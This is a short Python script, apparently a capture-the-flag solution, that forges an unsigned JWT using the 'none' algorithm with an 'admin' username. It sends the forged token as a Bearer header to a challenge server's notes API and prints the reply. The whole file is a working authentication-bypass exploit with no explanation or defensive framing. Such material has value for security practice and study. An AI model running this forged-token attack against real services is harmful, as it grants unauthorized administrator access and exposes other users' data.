import requests
import jwt

token = jwt.encode({"id": 1, "username": "admin"}, "", algorithm="none")
print("None token:", token)
r = requests.get("http://exp.cybergame.sk:7021/api/v2/notes", headers={"Authorization": f"Bearer {token}"})
print(r.text)
